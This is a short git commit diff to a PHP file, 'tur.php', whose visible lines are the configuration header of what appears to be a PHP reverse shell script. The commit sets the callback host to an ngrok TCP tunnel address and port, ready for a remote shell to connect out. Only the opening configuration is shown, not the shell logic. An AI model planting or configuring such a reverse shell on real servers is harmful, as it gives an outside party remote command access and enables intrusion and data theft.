872b2f9b338305e9712d4c0540b25d86be2e43de
bossdao1 <153760831+bossdao1@users.noreply.github.com>
2025-07-11 20:35:50 +0630

    Update tur.php

--- tur.php
+++ tur.php
@@ -1,7 +1,7 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.ap.ngrok.io/';  // CHANGE THIS
+$ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
 $port = 13184;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
